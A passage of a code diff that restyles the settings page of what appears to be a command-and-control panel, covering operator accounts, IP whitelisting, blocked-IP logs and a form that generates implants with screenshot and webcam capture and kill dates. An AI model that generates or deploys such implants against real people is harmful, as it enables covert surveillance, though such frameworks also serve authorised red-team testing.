+                    <label for="newPasswordInput" class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1.5">New Password</label>
+                    <input type="password" class="tactical-input" id="newPasswordInput" required>
+                </div>
+            </div>
+            <div class="px-6 py-3.5 bg-slate-950/60 border-t border-slate-800 flex justify-end gap-2.5">
+                <button type="button" data-modal-close class="tactical-btn-secondary">Cancel</button>
+                <button type="submit" class="tactical-btn-primary">Update Password</button>
+            </div>
+        </form>
+    </div>
+</div>
+{% endblock %}
+
+{% block extra_js %}
 <script>
 document.addEventListener('DOMContentLoaded', function() {
-    // Fetch and display users
     function fetchUsers() {
         fetch('{{ base_url }}/api/users', { credentials: 'include' })
             .then(response => response.json())
@@ -337,556 +436,353 @@ document.addEventListener('DOMContentLoaded', function() {
                 tbody.innerHTML = '';
                 users.forEach(user => {
                     const tr = document.createElement('tr');
-                    const td1 = document.createElement('td');
-                    td1.textContent = user.username;
-                    tr.appendChild(td1);
-                    const td2 = document.createElement('td');
-                    td2.textContent = user.email;
-                    tr.appendChild(td2);
-                    const td3 = document.createElement('td');
-                    const btn1 = document.createElement('button');
-                    btn1.className = 'btn btn-sm btn-outline-secondary change-password-btn me-2';
-                    btn1.setAttribute('data-user-id', user.id);
-                    btn1.setAttribute('data-username', user.username);
-                    btn1.innerHTML = '<i class="fas fa-key me-1"></i>Change Password';
-                    btn1.addEventListener('click', function() {
-                        const userId = this.getAttribute('data-user-id');
-                        const username = this.getAttribute('data-username');
-                        showChangePasswordModal(userId, username);
+                    tr.innerHTML = `
+                        <td class="font-medium text-slate-100">${GlyconUI.escapeHtml(user.username)}</td>
+                        <td class="font-mono text-xs text-slate-400">${GlyconUI.escapeHtml(user.email)}</td>
+                        <td class="text-right">
+                            <div class="inline-flex items-center justify-end gap-1.5">
+                                <button type="button" class="tactical-btn-secondary py-1 px-2.5 text-xs change-password-btn">Password</button>
+                                <button type="button" class="tactical-btn-secondary py-1 px-2.5 text-xs edit-user-btn">Edit</button>
+                                <button type="button" class="tactical-btn-danger py-1 px-2.5 text-xs delete-user-btn">Delete</button>
+                            </div>
+                        </td>
+                    `;
+
+                    tr.querySelector('.change-password-btn').addEventListener('click', () => {
+                        document.getElementById('changePasswordUserIdInput').value = user.id;
+                        document.getElementById('changePasswordModalLabel').textContent = `Change Password — ${user.username}`;
+                        document.getElementById('newPasswordInput').value = '';
+                        GlyconUI.openModal('changePasswordModal');
                     });
-                    td3.appendChild(btn1);
-                    const btn2 = document.createElement('button');
-                    btn2.className = 'btn btn-sm btn-outline-primary edit-user-btn me-2';
-                    btn2.setAttribute('data-user-id', user.id);
-                    btn2.setAttribute('data-username', user.username);
-                    btn2.setAttribute('data-email', user.email);
-                    btn2.innerHTML = '<i class="fas fa-edit me-1"></i>Edit';
-                    btn2.addEventListener('click', function() {
-                        const userId = this.getAttribute('data-user-id');
-                        const username = this.getAttribute('data-username');
-                        const email = this.getAttribute('data-email');
-                        showEditUserModal(userId, username, email);
+
+                    tr.querySelector('.edit-user-btn').addEventListener('click', () => {
+                        document.getElementById('editUserIdInput').value = user.id;
+                        document.getElementById('editUserModalLabel').textContent = `Edit Operator — ${user.username}`;
+                        document.getElementById('editUsernameInput').value = user.username;
+                        document.getElementById('editEmailInput').value = user.email;
+                        GlyconUI.openModal('editUserModal');
                     });
-                    td3.appendChild(btn2);
-                    const btn3 = document.createElement('button');
-                    btn3.className = 'btn btn-sm btn-outline-danger delete-user-btn';
-                    btn3.setAttribute('data-user-id', user.id);
-                    btn3.setAttribute('data-username', user.username);
-                    btn3.innerHTML = '<i class="fas fa-trash me-1"></i>Delete';
-                    btn3.addEventListener('click', function() {
-                        const userId = this.getAttribute('data-user-id');
-                        const username = this.getAttribute('data-username');
-                        if (confirm(`Are you sure you want to delete user "${username}"?`)) {
-                            fetch(`{{ base_url }}/api/users/${userId}`, {
-                                method: 'DELETE'
-                            })
-                            .then(response => response.json())
+
+                    tr.querySelector('.delete-user-btn').addEventListener('click', async () => {
+                        const confirmed = await GlyconUI.confirm({
+                            title: 'Delete Operator Account',
+                            message: `Are you sure you want to delete operator "${user.username}"?`,
+                            confirmText: 'Delete User',
+                            variant: 'danger'
+                        });
+                        if (!confirmed) return;
+
+                        fetch(`{{ base_url }}/api/users/${user.id}`, { method: 'DELETE' })
+                            .then(r => r.json())
                             .then(data => {
-                                alert(data.message || data.error);
+                                GlyconUI.toast('Operator Account', data.message || data.error, data.error ? 'danger' : 'success');
                                 fetchUsers();
                             })
-                            .catch(() => {
-                                alert('Error deleting user');
-                            });
-                        }
+                            .catch(() => GlyconUI.toast('Error', 'Failed to delete user', 'danger'));
                     });
-                    td3.appendChild(btn3);
-                    tr.appendChild(td3);
+
                     tbody.appendChild(tr);
                 });
             });
     }
 
-    // Initial fetch of users
     fetchUsers();
 
-    // Show edit user modal
-    function showEditUserModal(userId, username, email) {
-                        const modalHtml = `
-            <div class="modal fade" id="editUserModal" tabindex="-1" aria-labelledby="editUserModalLabel" aria-hidden="true">
-              <div class="modal-dialog">
-                <div class="modal-content">
-                  <div class="modal-header">
-                    <h5 class="modal-title" id="editUserModalLabel">Edit User ${username.replace(/"/g, '"')}</h5>
-                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
-                  </div>
-                  <div class="modal-body">
-                    <form id="editUserForm">
-                      <div class="mb-3">
-                        <label for="editUsernameInput" class="form-label">Username</label>
-                        <input type="text" class="form-control" id="editUsernameInput" value="${username.replace(/"/g, '"')}" required>
-                      </div>
-                      <div class="mb-3">
-                        <label for="editEmailInput" class="form-label">Email</label>
-                        <input type="email" class="form-control" id="editEmailInput" value="${email.replace(/"/g, '"')}" required>
-                      </div>
-                      <button type="submit" class="btn btn-primary">Save Changes</button>
-                    </form>
-                  </div>
-                </div>
-              </div>
-            </div>
-        `;
-        // Append modal to body
-        document.body.insertAdjacentHTML('beforeend', modalHtml);
-        const modal = new bootstrap.Modal(document.getElementById('editUserModal'));
-        modal.show();
+    document.getElementById('editUserForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const userId = document.getElementById('editUserIdInput').value;
+        const username = document.getElementById('editUsernameInput').value;
+        const email = document.getElementById('editEmailInput').value;
 
-        // Handle form submission
-        document.getElementById('editUserForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const newUsername = document.getElementById('editUsernameInput').value;
-            const newEmail = document.getElementById('editEmailInput').value;
-            fetch(`{{ base_url }}/api/users/${userId}`, {
-                method: 'PUT',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({username: newUsername, email: newEmail})
-            })
-            .then(response => response.json())
-            .then(data => {
-                alert(data.message || data.error);
-                modal.hide();
-                document.getElementById('editUserModal').remove();
-                fetchUsers();
-            })
-            .catch(() => {
-                alert('Error updating user');
-            });
-        });
+        fetch(`{{ base_url }}/api/users/${userId}`, {
+            method: 'PUT',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username, email })
+        })
+        .then(r => r.json())
+        .then(data => {
+            GlyconUI.closeModal('editUserModal');
+            GlyconUI.toast('Operator Updated', data.message || data.error, data.error ? 'danger' : 'success');
+            fetchUsers();
+        })
+        .catch(() => GlyconUI.toast('Error', 'Error updating user', 'danger'));
+    });
 
-        // Remove modal from DOM on hide
-        document.getElementById('editUserModal').addEventListener('hidden.bs.modal', function () {
-            document.getElementById('editUserModal').remove();
-        });
-    }
+    document.getElementById('changePasswordForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const userId = document.getElementById('changePasswordUserIdInput').value;
+        const newPassword = document.getElementById('newPasswordInput').value;
 
-    // Show change password modal
-    function showChangePasswordModal(userId, username) {
-        const modalHtml = `
-            <div class="modal fade" id="changePasswordModal" tabindex="-1" aria-labelledby="changePasswordModalLabel" aria-hidden="true">
-              <div class="modal-dialog">
-                <div class="modal-content">
-                  <div class="modal-header">
-                    <h5 class="modal-title" id="changePasswordModalLabel">Change Password for ${username.replace(/"/g, '"')}</h5>
-                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
-                  </div>
-                  <div class="modal-body">
-                    <form id="changePasswordForm">
-                      <div class="mb-3">
-                        <label for="newPasswordInput" class="form-label">New Password</label>
-                        <input type="password" class="form-control" id="newPasswordInput" required>
-                      </div>
-                      <button type="submit" class="btn btn-primary">Change Password</button>
-                    </form>
-                  </div>
-                </div>
-              </div>
-            </div>
-        `;
-        // Append modal to body
-        document.body.insertAdjacentHTML('beforeend', modalHtml);
-        const modal = new bootstrap.Modal(document.getElementById('changePasswordModal'));
-        modal.show();
+        fetch(`{{ base_url }}/api/users/${userId}/change_password`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ new_password: newPassword })
+        })
+        .then(r => r.json())
+        .then(data => {
+            GlyconUI.closeModal('changePasswordModal');
+            GlyconUI.toast('Password Updated', data.message || data.error, data.error ? 'danger' : 'success');
+        })
+        .catch(() => GlyconUI.toast('Error', 'Error changing password', 'danger'));
+    });
 
-        // Handle form submission
-        document.getElementById('changePasswordForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const newPassword = document.getElementById('newPasswordInput').value;
-            fetch(`{{ base_url }}/api/users/${userId}/change_password`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({new_password: newPassword})
-            })
-            .then(response => response.json())
-            .then(data => {
-                alert(data.message || data.error);
-                modal.hide();
-                document.getElementById('changePasswordModal').remove();
-            })
-            .catch(() => {
-                alert('Error changing password');
-            });
-        });
-
-        // Remove modal from DOM on hide
-        document.getElementById('changePasswordModal').addEventListener('hidden.bs.modal', function () {
-            document.getElementById('changePasswordModal').remove();
-        });
-    }
-
-    // Handle add user form submission
     document.getElementById('addUserForm').addEventListener('submit', function(e) {
         e.preventDefault();
         const username = document.getElementById('newUsername').value;
         const email = document.getElementById('newEmail').value;
         const password = document.getElementById('newPassword').value;
+
         fetch('{{ base_url }}/api/users', {
             method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({username, email, password})
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username, email, password })
         })
-        .then(response => response.json())
+        .then(r => r.json())
         .then(data => {
-            alert(data.message || data.error);
+            GlyconUI.toast('Operator Account', data.message || data.error, data.error ? 'danger' : 'success');
             if (data.message) {
-                // Clear form
                 document.getElementById('addUserForm').reset();
-                // Refresh user list
                 fetchUsers();
             }
         })
-        .catch(() => {
-            alert('Error adding user');
-        });
+        .catch(() => GlyconUI.toast('Error', 'Error adding user', 'danger'));
     });
 
     // IP Whitelist functions
     function fetchIPWhitelist() {
         fetch('{{ base_url }}/api/ip_whitelist', { credentials: 'include' })
-            .then(response => response.json())
+            .then(r => r.json())
             .then(data => {
-                if (data.status === 'success') {
-                    const tbody = document.querySelector('#ipWhitelistTable tbody');
-                    tbody.innerHTML = '';
-                    data.whitelist.forEach(entry => {
-                        const tr = document.createElement('tr');
-                        if (!entry.enabled) {
-                            tr.style.textDecoration = 'line-through';
-                            tr.style.opacity = '0.6';
-                        }
-                        const td1 = document.createElement('td');
-                        td1.textContent = entry.ip_range;
-                        tr.appendChild(td1);
-                        const td2 = document.createElement('td');
-                        td2.textContent = entry.description;
-                        tr.appendChild(td2);
-                        const td3 = document.createElement('td');
-                        const btn1 = document.createElement('button');
-                        btn1.className = 'btn btn-sm btn-outline-primary edit-ip-btn me-2';
-                        btn1.setAttribute('data-id', entry.id);
-                        btn1.setAttribute('data-range', entry.ip_range);
-                        btn1.setAttribute('data-description', entry.description);
-                        btn1.innerHTML = '<i class="fas fa-edit me-1"></i>Edit';
-                        td3.appendChild(btn1);
-                        // Only show delete button for non-default entries
-                        if (!entry.description.includes('Default allow all')) {
-                            const btn2 = document.createElement('button');
-                            btn2.className = 'btn btn-sm btn-outline-danger delete-ip-btn';
-                            btn2.setAttribute('data-id', entry.id);
-                            btn2.setAttribute('data-range', entry.ip_range);
-                            btn2.innerHTML = '<i class="fas fa-trash me-1"></i>Delete';
-                            td3.appendChild(btn2);
-                        }
-                        tr.appendChild(td3);
-                        tbody.appendChild(tr);
+                if (data.status !== 'success') return;
+                const tbody = document.querySelector('#ipWhitelistTable tbody');
+                tbody.innerHTML = '';
+                data.whitelist.forEach(entry => {
+                    const tr = document.createElement('tr');
+                    if (!entry.enabled) tr.className = 'opacity-50 line-through';
+
+                    const badgeHtml = entry.enabled
+                        ? '<span class="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-xs font-medium bg-emerald-500/15 text-emerald-400 border border-emerald-500/30">Enabled</span>'
+                        : '<span class="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-xs font-medium bg-rose-500/15 text-rose-400 border border-rose-500/30">Disabled</span>';
+
+                    tr.innerHTML = `
+                        <td class="font-mono text-xs text-emerald-300">${GlyconUI.escapeHtml(entry.ip_range)}</td>
+                        <td class="text-xs text-slate-300">${GlyconUI.escapeHtml(entry.description || '')}</td>
+                        <td>${badgeHtml}</td>
+                        <td class="text-right">
+                            <div class="inline-flex items-center gap-1.5">
+                                <button type="button" class="tactical-btn-secondary py-1 px-2 text-xs edit-ip-btn">Edit</button>
+                                ${!String(entry.description || '').includes('Default allow all') ? '<button type="button" class="tactical-btn-danger py-1 px-2 text-xs delete-ip-btn">Delete</button>' : ''}
+                            </div>
+                        </td>
+                    `;
+
+                    tr.querySelector('.edit-ip-btn').addEventListener('click', () => {
+                        document.getElementById('editIPIdInput').value = entry.id;
+                        document.getElementById('editIPRangeInput').value = entry.ip_range;
+                        document.getElementById('editIPDescriptionInput').value = entry.description || '';
+                        document.getElementById('editIPEnabledInput').checked = !!entry.enabled;
+                        GlyconUI.openModal('editIPModal');
                     });
 
-                    // Add event listeners for edit buttons
-                    document.querySelectorAll('.edit-ip-btn').forEach(button => {
-                        button.addEventListener('click', function() {
-                            showEditIPModalFromData(this);
-                        });
-                    });
+                    const delBtn = tr.querySelector('.delete-ip-btn');
+                    if (delBtn) {
+                        delBtn.addEventListener('click', async () => {
+                            const confirmed = await GlyconUI.confirm({
+                                title: 'Delete Whitelist Rule',
+                                message: `Are you sure you want to remove "${entry.ip_range}" from the IP whitelist?`,
+                                confirmText: 'Delete Rule',
+                                variant: 'danger'
+                            });
+                            if (!confirmed) return;
 
-                    // Add event listeners for delete buttons
-                    document.querySelectorAll('.delete-ip-btn').forEach(button => {
-                        button.addEventListener('click', function() {
-                            deleteIPFromData(this);
+                            fetch(`{{ base_url }}/api/ip_whitelist/${entry.id}`, {
+                                method: 'DELETE',
+                                credentials: 'include'
+                            })
+                            .then(r => r.json())
+                            .then(res => {
+                                if (res.status === 'success') {
+                                    GlyconUI.toast('Whitelist Updated', res.message || 'Rule deleted', 'success');
+                                    fetchIPWhitelist();
+                                } else {
+                                    GlyconUI.toast('Error', res.message || 'Error deleting IP range', 'danger');
+                                }
+                            });
                         });
-                    });
-                } else {
-                    console.error('Error fetching IP whitelist:', data.message);
-                }
-            })
-            .catch(() => {
-                console.error('Error fetching IP whitelist');
+                    }
+
+                    tbody.appendChild(tr);
+                });
             });
     }
 
-    // Blocked logs functions
     function fetchBlockedLogs() {
         fetch('{{ base_url }}/api/blocked_logs', { credentials: 'include' })
-            .then(response => response.json())
+            .then(r => r.json())
             .then(data => {
-                if (data.status === 'success') {
-                    const tbody = document.querySelector('#blockedLogsTable tbody');
-                    tbody.innerHTML = '';
-                    data.logs.forEach(log => {
-                        const tr = document.createElement('tr');
-                        const td1 = document.createElement('td');
-                        td1.textContent = log.first_seen;
-                        tr.appendChild(td1);
-                        const td2 = document.createElement('td');
-                        td2.textContent = log.last_seen;
-                        tr.appendChild(td2);
-                        const td3 = document.createElement('td');
-                        td3.textContent = log.ip;
-                        tr.appendChild(td3);
-                        const td4 = document.createElement('td');
-                        td4.textContent = log.count;
-                        tr.appendChild(td4);
-                        const td5 = document.createElement('td');
-                        const btn = document.createElement('button');
-                        btn.className = 'btn btn-sm btn-outline-success add-to-whitelist-btn';
-                        btn.setAttribute('data-ip', log.ip);
-                        btn.setAttribute('data-log-id', log.id);
-                        btn.innerHTML = '<i class="fas fa-plus me-1"></i>Add to Whitelist';
-                        td5.appendChild(btn);
-                        tr.appendChild(td5);
-                        tbody.appendChild(tr);
-                    });
+                if (data.status !== 'success') return;
+                const tbody = document.querySelector('#blockedLogsTable tbody');
+                tbody.innerHTML = '';
+                if (!data.logs || data.logs.length === 0) {
+                    tbody.innerHTML = '<tr><td colspan="5" class="text-center py-8 text-slate-500">No blocked IP attempts recorded</td></tr>';
+                    return;
+                }
+                data.logs.forEach(log => {
+                    const tr = document.createElement('tr');
+                    tr.innerHTML = `
+                        <td class="font-mono text-xs text-slate-400">${GlyconUI.escapeHtml(log.first_seen)}</td>
+                        <td class="font-mono text-xs text-slate-400">${GlyconUI.escapeHtml(log.last_seen)}</td>
+                        <td class="font-mono text-xs text-rose-400">${GlyconUI.escapeHtml(log.ip)}</td>
+                        <td class="font-mono text-xs text-slate-300">${GlyconUI.escapeHtml(log.count)}</td>
+                        <td class="text-right">
+                            <button type="button" class="tactical-btn-secondary py-1 px-2.5 text-xs text-emerald-400 add-to-whitelist-btn">+ Whitelist</button>
+                        </td>
+                    `;
 
-                    // Add event listeners for add to whitelist buttons
-                    document.querySelectorAll('.add-to-whitelist-btn').forEach(button => {
-                        button.addEventListener('click', function() {
-                            const logId = this.getAttribute('data-log-id');
-                            const ip = this.getAttribute('data-ip');
-                            if (confirm(`Add ${ip} to whitelist?`)) {
-                                fetch(`{{ base_url }}/api/blocked_logs/${logId}/add_to_whitelist`, {
-                                    method: 'POST',
-                                    headers: {'Content-Type': 'application/json'},
-                                    credentials: 'include'
-                                })
-                                .then(response => response.json())
-                                .then(data => {
-                                    if (data.status === 'success') {
-                                        alert('IP added to whitelist successfully');
-                                        fetchIPWhitelist();
-                                        fetchBlockedLogs();
-                                    } else {
-                                        alert(data.message || 'Error adding to whitelist');
-                                    }
-                                })
-                                .catch(() => {
-                                    alert('Error adding to whitelist');
-                                });
+                    tr.querySelector('.add-to-whitelist-btn').addEventListener('click', async () => {
+                        const confirmed = await GlyconUI.confirm({
+                            title: 'Approve Blocked IP',
+                            message: `Add ${log.ip} to the allowed IP whitelist?`,
+                            confirmText: 'Add to Whitelist',
+                            variant: 'primary'
+                        });
+                        if (!confirmed) return;
+
+                        fetch(`{{ base_url }}/api/blocked_logs/${log.id}/add_to_whitelist`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            credentials: 'include'
+                        })
+                        .then(r => r.json())
+                        .then(res => {
+                            if (res.status === 'success') {
+                                GlyconUI.toast('Whitelisted', `${log.ip} added to whitelist`, 'success');
+                                fetchIPWhitelist();
+                                fetchBlockedLogs();
+                            } else {
+                                GlyconUI.toast('Error', res.message || 'Error adding to whitelist', 'danger');
                             }
                         });
                     });
-                }
-            })
-            .catch(() => {
-                console.error('Error fetching blocked logs');
+
+                    tbody.appendChild(tr);
+                });
             });
     }
 
-    // Show edit IP modal
-    function showEditIPModalFromData(button) {
-        const id = button.getAttribute('data-id');
-        const range = button.getAttribute('data-range');
-        const description = button.getAttribute('data-description');
-        const enabled = button.getAttribute('data-enabled') === 'True';
-        const modalHtml = `
-            <div class="modal fade" id="editIPModal" tabindex="-1" aria-labelledby="editIPModalLabel" aria-hidden="true">
-              <div class="modal-dialog">
-                <div class="modal-content">
-                  <div class="modal-header">
-                    <h5 class="modal-title" id="editIPModalLabel">Edit IP Range</h5>
-                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
-                  </div>
-                  <div class="modal-body">
-                    <form id="editIPForm">
-                      <div class="mb-3">
-                        <label for="editIPRangeInput" class="form-label">IP Range</label>
-                        <input type="text" class="form-control" id="editIPRangeInput" value="${range.replace(/"/g, '"')}" required>
-                      </div>
-                      <div class="mb-3">
-                        <label for="editIPDescriptionInput" class="form-label">Description</label>
-                        <input type="text" class="form-control" id="editIPDescriptionInput" value="${description.replace(/"/g, '"')}">
-                      </div>
-                      <div class="mb-3 form-check">
-                        <input type="checkbox" class="form-check-input" id="editIPEnabledInput" ${enabled ? 'checked' : ''}>
-                        <label class="form-check-label" for="editIPEnabledInput">Enabled</label>
-                      </div>
-                      <button type="submit" class="btn btn-primary">Save Changes</button>
-                    </form>
-                  </div>
-                </div>
-              </div>
-            </div>
-        `;
-        // Append modal to body
-        document.body.insertAdjacentHTML('beforeend', modalHtml);
-        const modal = new bootstrap.Modal(document.getElementById('editIPModal'));
-        modal.show();
-
-        // Handle form submission
-        document.getElementById('editIPForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const newRange = document.getElementById('editIPRangeInput').value;
-            const newDescription = document.getElementById('editIPDescriptionInput').value;
-            const newEnabled = document.getElementById('editIPEnabledInput').checked;
-            fetch(`{{ base_url }}/api/ip_whitelist/${id}`, {
-                method: 'PUT',
-                headers: {'Content-Type': 'application/json'},
-                credentials: 'include',
-                body: JSON.stringify({ip_range: newRange, description: newDescription, enabled: newEnabled})
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.status === 'success') {
-                    alert(data.message || 'IP range updated successfully');
-                    modal.hide();
-                    document.getElementById('editIPModal').remove();
-                    fetchIPWhitelist();
-                } else {
-                    alert(data.message || 'Error updating IP range');
-                }
-            })
-            .catch(() => {
-                alert('Error updating IP range');
-            });
-        });
-
-        // Remove modal from DOM on hide
-        document.getElementById('editIPModal').addEventListener('hidden.bs.modal', function () {
-            document.getElementById('editIPModal').remove();
-        });
-    }
-
-    // Handle add IP range button click
-    document.getElementById('addIPRangeBtn').addEventListener('click', function() {
-        const modal = new bootstrap.Modal(document.getElementById('addIPModal'));
-        modal.show();
-    });
-
-    // Handle add IP form submission
-    document.getElementById('addIPForm').addEventListener('submit', function(e) {
+    document.getElementById('editIPForm').addEventListener('submit', function(e) {
         e.preventDefault();
-        const ipRange = document.getElementById('newIPRange').value;
-        const description = document.getElementById('newIPDescription').value;
-        fetch('{{ base_url }}/api/ip_whitelist', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
+        const id = document.getElementById('editIPIdInput').value;
+        const ip_range = document.getElementById('editIPRangeInput').value;
+        const description = document.getElementById('editIPDescriptionInput').value;
+        const enabled = document.getElementById('editIPEnabledInput').checked;
+
+        fetch(`{{ base_url }}/api/ip_whitelist/${id}`, {
+            method: 'PUT',
+            headers: { 'Content-Type': 'application/json' },
             credentials: 'include',
-            body: JSON.stringify({ip_range: ipRange, description: description})
+            body: JSON.stringify({ ip_range, description, enabled })
         })
-        .then(response => response.json())
+        .then(r => r.json())
         .then(data => {
             if (data.status === 'success') {
-                alert(data.message || 'IP range added successfully');
-                // Clear form
-                document.getElementById('addIPForm').reset();
-                // Close modal
-                const modal = bootstrap.Modal.getInstance(document.getElementById('addIPModal'));
-                modal.hide();
-                // Refresh list
+                GlyconUI.closeModal('editIPModal');
+                GlyconUI.toast('Whitelist Updated', data.message || 'Rule updated', 'success');
                 fetchIPWhitelist();
             } else {
-                alert(data.message || 'Error adding IP range');
+                GlyconUI.toast('Error', data.message || 'Error updating IP range', 'danger');
             }
-        })
-        .catch(() => {
-            alert('Error adding IP range');
         });
     });
 
-    // Delete IP function
-    function deleteIPFromData(button) {
-        const id = button.getAttribute('data-id');
-        const range = button.getAttribute('data-range');
-        if (confirm(`Are you sure you want to delete IP range "${range}"?`)) {
-            fetch(`{{ base_url }}/api/ip_whitelist/${id}`, {
-                method: 'DELETE',
-                credentials: 'include'
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.status === 'success') {
-                    alert(data.message || 'IP range deleted successfully');
-                    fetchIPWhitelist();
-                } else {
-                    alert(data.message || 'Error deleting IP range');
-                }
-            })
-            .catch(() => {
-                alert('Error deleting IP range');
-            });
-        }
-    }
+    document.getElementById('addIPRangeBtn').addEventListener('click', () => {
+        GlyconUI.openModal('addIPModal');
+    });
 
-    // Fetch and populate general settings
-    function fetchGeneralSettings() {
-        fetch('{{ base_url }}/api/settings', { credentials: 'include' })
-            .then(response => response.json())
-            .then(data => {
-                if (data.status === 'success') {
-                    const settings = data.settings;
-                    document.getElementById('redirectUrl').value = settings.redirect_url || '';
-                }
-            })
-            .catch(() => {
-                console.error('Error fetching general settings');
-            });
-    }
-
-    // Handle blocked IP settings form submission
-    document.getElementById('blockedIPSettingsForm').addEventListener('submit', function(e) {
+    document.getElementById('addIPForm').addEventListener('submit', function(e) {
         e.preventDefault();
-        const redirectUrl = document.getElementById('redirectUrl').value;
-        const data = {
-            redirect_url: redirectUrl
-        };
-        fetch('{{ base_url }}/api/settings', {
+        const ip_range = document.getElementById('newIPRange').value;
+        const description = document.getElementById('newIPDescription').value;
+
+        fetch('{{ base_url }}/api/ip_whitelist', {
             method: 'POST',
-            headers: {'Content-Type': 'application/json'},
+            headers: { 'Content-Type': 'application/json' },
             credentials: 'include',
-            body: JSON.stringify(data)
+            body: JSON.stringify({ ip_range, description })
         })
-        .then(response => response.json())
+        .then(r => r.json())
         .then(data => {
             if (data.status === 'success') {
-                alert('Settings saved successfully');
+                document.getElementById('addIPForm').reset();
+                GlyconUI.closeModal('addIPModal');
+                GlyconUI.toast('Subnet Added', data.message || 'IP range added to whitelist', 'success');
+                fetchIPWhitelist();
             } else {
-                alert(data.message || 'Error saving settings');
+                GlyconUI.toast('Error', data.message || 'Error adding IP range', 'danger');
             }
-        })
-        .catch(() => {
-            alert('Error saving settings');
         });
     });
 
-    // Initial fetch of IP whitelist and blocked logs
+    function fetchGeneralSettings() {
+        fetch('{{ base_url }}/api/settings', { credentials: 'include' })
+            .then(r => r.json())
+            .then(data => {
+                if (data.status === 'success' && data.settings) {
+                    document.getElementById('redirectUrl').value = data.settings.redirect_url || '';
+                }
+            });
+    }
+
+    document.getElementById('blockedIPSettingsForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const redirect_url = document.getElementById('redirectUrl').value;
+        fetch('{{ base_url }}/api/settings', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            credentials: 'include',
+            body: JSON.stringify({ redirect_url })
+        })
+        .then(r => r.json())
+        .then(data => {
+            if (data.status === 'success') {
+                GlyconUI.toast('Settings Saved', 'Blocked IP redirect URL updated', 'success');
+            } else {
+                GlyconUI.toast('Error', data.message || 'Error saving settings', 'danger');
+            }
+        });
+    });
+
     fetchIPWhitelist();
     fetchBlockedLogs();
     fetchGeneralSettings();
 
-    // Handle agent config form submission
     document.getElementById('agentConfigForm').addEventListener('submit', function(e) {
         e.preventDefault();
-        const checkinInterval = document.getElementById('checkinInterval').value;
-        const serverUrl = document.getElementById('serverUrl').value;
-        const takeScreenshots = document.getElementById('takeScreenshots').checked;
-        const screenshotFrequency = document.getElementById('screenshotFrequency').value;
-        const takeWebcam = document.getElementById('takeWebcam').checked;
-        const webcamFrequency = document.getElementById('webcamFrequency').value;
-        const killDate = document.getElementById('killDate').value;
-        const enableKillDate = document.getElementById('enableKillDate').checked;
-        const trustedCertificate = document.getElementById('trustedCertificate').checked;
-        const data = {
-            checkin_interval: parseInt(checkinInterval),
-            server_url: serverUrl,
-            take_screenshots: takeScreenshots,
-            screenshot_frequency: parseInt(screenshotFrequency),
-            take_webcam: takeWebcam,
-            webcam_frequency: parseInt(webcamFrequency),
-            killdate: killDate,
-            killdate_enabled: enableKillDate,
-            trusted_certificate: trustedCertificate
+        const payload = {
+            checkin_interval: parseInt(document.getElementById('checkinInterval').value),
+            server_url: document.getElementById('serverUrl').value,
+            take_screenshots: document.getElementById('takeScreenshots').checked,
+            screenshot_frequency: parseInt(document.getElementById('screenshotFrequency').value),
+            take_webcam: document.getElementById('takeWebcam').checked,
+            webcam_frequency: parseInt(document.getElementById('webcamFrequency').value),
+            killdate: document.getElementById('killDate').value,
+            killdate_enabled: document.getElementById('enableKillDate').checked,
+            trusted_certificate: document.getElementById('trustedCertificate').checked
         };
+
         fetch('{{ base_url }}/api/generate_agent', {
             method: 'POST',
-            headers: {'Content-Type': 'application/json'},
+            headers: { 'Content-Type': 'application/json' },
             credentials: 'include',
-            body: JSON.stringify(data)
+            body: JSON.stringify(payload)
         })
-        .then(response => response.json())
+        .then(r => r.json())
         .then(data => {
             if (data.status === 'success') {
-                // Commands are now static, just show the download section
                 document.getElementById('downloadLink').href = data.download_url;
                 document.getElementById('agentDownload').style.display = 'block';
                 document.getElementById('agentError').style.display = 'none';
+                GlyconUI.toast('Agent Generated', 'Implant profile saved and binary ready', 'success');
             } else {
                 document.getElementById('agentError').textContent = data.message;
                 document.getElementById('agentError').style.display = 'block';
@@ -896,68 +792,69 @@ document.addEventListener('DOMContentLoaded', function() {
         .catch(() => {
             document.getElementById('agentError').textContent = 'Error generating agent';
             document.getElementById('agentError').style.display = 'block';
-            document.getElementById('agentDownload').style.display = 'none';
         });
     });
 
-    // Handle copy buttons
     document.addEventListener('click', function(e) {
-        if (e.target.classList.contains('copy-btn') || e.target.closest('.copy-btn')) {
-            const button = e.target.classList.contains('copy-btn') ? e.target : e.target.closest('.copy-btn');
-            const targetId = button.getAttribute('data-target');
-            const text = document.getElementById(targetId).textContent;
+        const button = e.target.closest('.copy-btn');
+        if (!button) return;
+        const targetId = button.getAttribute('data-target');
+        const text = document.getElementById(targetId)?.textContent;
+        if (text) {
             navigator.clipboard.writeText(text).then(() => {
-                alert('Copied to clipboard');
-            }).catch(() => {
-                alert('Failed to copy');
+                GlyconUI.toast('Copied', 'Command copied to clipboard', 'success', 2000);
             });
         }
     });
 
-    // Handle deactivate defaults button
-    document.getElementById('deactivateDefaultsBtn').addEventListener('click', function() {
-        if (confirm('Are you sure you want to deactivate allow all rules? This will disable the default IPv4 and IPv6 allow-all rules.')) {
